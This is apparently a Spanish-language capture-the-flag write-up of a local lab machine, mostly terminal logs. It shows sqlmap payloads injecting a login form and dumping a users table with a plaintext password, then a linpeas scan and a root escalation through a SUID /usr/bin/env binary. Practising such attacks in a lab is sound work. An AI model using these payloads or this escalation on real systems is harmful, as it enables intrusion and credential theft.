
```bash

  ❯❯ /home/v3ctr4x : gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 275]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```

De momento no consigo mucha informacion, le voy a pasar un SQLmap para ver si consigo sacar algo de informacion

```bash


  ❯❯ /home/v3ctr4x : sqlmap -u "http://172.17.0.2" --batch --dbs --forms
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.4#stable}
|_ -| . [)]     | .| . |
|___|_  []_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end users responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:35:09 /2025-04-30/

[10:35:09] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=1qc4alfg3rt...hbkh92a4bj'). Do you want to use those [Y/n] Y
[10:35:09] [INFO] searching for forms
[1/1] Form:
POST http://172.17.0.2/index.php
POST data: name=&password=&submit=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: name=&password=&submit=] (Warning: blank fields detected): name=&password=&submit=
do you want to fill blank fields with random values? [Y/n] Y
[10:35:09] [INFO] using '/home/v3ctr4x/.local/share/sqlmap/output/results-04302025_1035am.csv' as the CSV results file in multiple targets mode
got a 302 redirect to 'http://172.17.0.2/index.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[10:35:09] [INFO] testing if the target URL content is stable
[10:35:10] [WARNING] POST parameter 'name' does not appear to be dynamic
[10:35:10] [INFO] heuristic (basic) test shows that POST parameter 'name' might be injectable (possible DBMS: 'MySQL')
[10:35:10] [INFO] testing for SQL injection on POST parameter 'name'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[10:35:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:35:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:35:10] [INFO] testing 'Generic inline queries'
[10:35:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:35:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:35:11] [INFO] POST parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable 
[10:35:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:35:11] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:35:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:35:11] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:35:11] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:35:11] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[10:35:11] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:35:11] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:35:11] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:35:12] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:35:12] [INFO] POST parameter 'name' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[10:35:12] [INFO] testing 'MySQL inline queries'
[10:35:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:36:02] [INFO] POST parameter 'name' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[10:36:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:36:52] [INFO] POST parameter 'name' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[10:36:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:36:52] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[10:36:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:36:53] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[10:36:53] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[10:36:53] [INFO] testing 'MySQL UNION query (43) - 21 to 40 columns'
[10:36:54] [INFO] testing 'MySQL UNION query (43) - 41 to 60 columns'
[10:36:54] [INFO] testing 'MySQL UNION query (43) - 61 to 80 columns'
[10:36:55] [INFO] testing 'MySQL UNION query (43) - 81 to 100 columns'
[10:36:56] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 171 HTTP(s) requests:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: name=-1182' OR 3867=3867#&password=sQnN&submit=AonO

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: name=zhmB' OR (SELECT 5024 FROM(SELECT COUNT(*),CONCAT(0x716a6b7671,(SELECT (ELT(5024=5024,1))),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- issD&password=sQnN&submit=AonO

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: name=zhmB';SELECT SLEEP(5)#&password=sQnN&submit=AonO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=zhmB' AND (SELECT 6603 FROM (SELECT(SLEEP(5)))ZBVG)-- ngOU&password=sQnN&submit=AonO
---
do you want to exploit this SQL injection? [Y/n] Y
[10:36:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[10:36:56] [INFO] fetching database names
[10:36:56] [INFO] retrieved: 'information_schema'
[10:36:56] [INFO] retrieved: 'performance_schema'
[10:36:56] [INFO] retrieved: 'register'
[10:36:57] [INFO] retrieved: 'sys'
[10:36:57] [INFO] retrieved: 'mysql'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys

[10:36:57] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/v3ctr4x/.local/share/sqlmap/output/results-04302025_1035am.csv'

[*] ending @ 10:36:57 /2025-04-30/
```

```bash
 ❯❯ /home/v3ctr4x : sqlmap -u "http://172.17.0.2" --batch --forms -D register -T users --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end users responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:43:19 /2025-04-30/

[10:43:19] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=v9octagfu7i...1ke083u6va'). Do you want to use those [Y/n] Y
[10:43:19] [INFO] searching for forms
[1/1] Form:
POST http://172.17.0.2/index.php
POST data: name=&password=&submit=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: name=&password=&submit=] (Warning: blank fields detected): name=&password=&submit=
do you want to fill blank fields with random values? [Y/n] Y
[10:43:19] [INFO] resuming back-end DBMS 'mysql' 
[10:43:19] [INFO] using '/home/v3ctr4x/.local/share/sqlmap/output/results-04302025_1043am.csv' as the CSV results file in multiple targets mode
got a 302 redirect to 'http://172.17.0.2/index.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: name=-1182' OR 3867=3867#&password=sQnN&submit=AonO

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: name=zhmB' OR (SELECT 5024 FROM(SELECT COUNT(*),CONCAT(0x716a6b7671,(SELECT (ELT(5024=5024,1))),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- issD&password=sQnN&submit=AonO

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: name=zhmB';SELECT SLEEP(5)#&password=sQnN&submit=AonO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=zhmB' AND (SELECT 6603 FROM (SELECT(SLEEP(5)))ZBVG)-- ngOU&password=sQnN&submit=AonO
---
do you want to exploit this SQL injection? [Y/n] Y
[10:43:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[10:43:19] [INFO] fetching columns for table 'users' in database 'register'
[10:43:19] [INFO] retrieved: 'username'
[10:43:20] [INFO] retrieved: 'varchar(30)'
[10:43:20] [INFO] retrieved: 'passwd'
[10:43:20] [INFO] retrieved: 'varchar(30)'
[10:43:20] [INFO] fetching entries for table 'users' in database 'register'
[10:43:20] [INFO] retrieved: 'KJSDFG789FGSDF78'
[10:43:20] [INFO] retrieved: 'dylan'
Database: register
Table: users
[1 entry]
+------------------+----------+
| passwd           | username |
+------------------+----------+
| KJSDFG789FGSDF78 | dylan    |
+------------------+----------+

[10:43:20] [INFO] table 'register.users' dumped to CSV file '/home/v3ctr4x/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv'
[10:43:20] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/v3ctr4x/.local/share/sqlmap/output/results-04302025_1043am.csv'

[*] ending @ 10:43:20 /2025-04-30/
```

Bingo, tenemos las credenciales de inicio de sesion

![[Pasted image 20250430104449.png]]

Ya tenemos todo lo necesario para poder entrar por SSH, ahora a ver como saco la escalada de privilegios de la maquina

```bash
<ss-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64                               
--2025-04-30 10:49:59--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/peass-ng/PEASS-ng/releases/download/20250424-d80957fb/linpeas_linux_amd64 [following]
--2025-04-30 10:50:00--  https://github.com/peass-ng/PEASS-ng/releases/download/20250424-d80957fb/linpeas_linux_amd64
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/8151602e-bef3-4b86-8b1f-ccf36034840c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250430%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250430T084919Z&X-Amz-Expires=300&X-Amz-Signature=866830ea35e90bf0e844b35504ca825f07d00b73afbb3cef39d3fcdfa247a1f8&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas_linux_amd64&response-content-type=application%2Foctet-stream [following]
--2025-04-30 10:50:00--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/8151602e-bef3-4b86-8b1f-ccf36034840c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250430%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250430T084919Z&X-Amz-Expires=300&X-Amz-Signature=866830ea35e90bf0e844b35504ca825f07d00b73afbb3cef39d3fcdfa247a1f8&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas_linux_amd64&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3227568 (3.1M) [application/octet-stream]
Saving to: 'linpeas_linux_amd64'

linpeas_linux_amd64    100%[============================>]   3.08M  1.90MB/s    in 1.6s    

2025-04-30 10:50:03 (1.90 MB/s) - 'linpeas_linux_amd64' saved [3227568/3227568]

dylan@a4b04d4cfc37:~$ chmod +x linpeas_linux_amd64                                         
dylan@a4b04d4cfc37:~$ ./linpeas_linux_amd64  
```

descargo linpeas para ver si puedo sacar algun permiso raro dentro de la maquina

```bash
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 331K Jan  2  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 55K Feb 21  2022 /usr/bin/su
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 43K Jan  8  2024 /usr/bin/env
-rwsr-xr-x 1 root root 35K Feb 21  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 47K Feb 21  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root shadow 27K Jan 10  2024 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 23K Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 71K Feb  6  2024 /usr/bin/chage
-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 23K Feb  6  2024 /usr/bin/expiry
-rwxr-sr-x 1 root _ssh 287K Jan  2  2024 /usr/bin/ssh-agent
```

Viendo esto veo que tiene como vector de ataque /usr/bin/env, asi que vamos a intentar sacarle todo el jugo a esto

```bash
dylan@a4b04d4cfc37:~$ /usr/bin/env /bin/bash                                               
bash-5.1$ whoami
dylan
bash-5.1$ exit  
exit
dylan@a4b04d4cfc37:~$ sudo /usr/bin/env /bin/bash                                          
-bash: sudo: command not found
dylan@a4b04d4cfc37:~$ sudo                                                                 
-bash: sudo: command not found
dylan@a4b04d4cfc37:~$ /bin/bash                                                            
dylan@a4b04d4cfc37:~$ python3
Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> exit()
dylan@a4b04d4cfc37:~$ sudo env /bin/sh                                                     
bash: sudo: command not found
dylan@a4b04d4cfc37:~$ env/bin/bash                                                         
bash: env/bin/bash: No such file or directory
dylan@a4b04d4cfc37:~$ /usr/bin/env /bin/bash                                               
bash-5.1$ whoami
dylan
bash-5.1$ exit
exit
dylan@a4b04d4cfc37:~$ cd /usr/bin/                                                         
dylan@a4b04d4cfc37:/usr/bin$ ls                                                  
 env                                

dylan@a4b04d4cfc37:/usr/bin$ ./env /bin/sh -p                                              
# whoami
root
# 
```

Al ser un SUID con permisos de ejecucion y demas, he conseguido escalar los privilegios para ser root, asi hemos conseguido el root

![[Pasted image 20250430113138.png]]
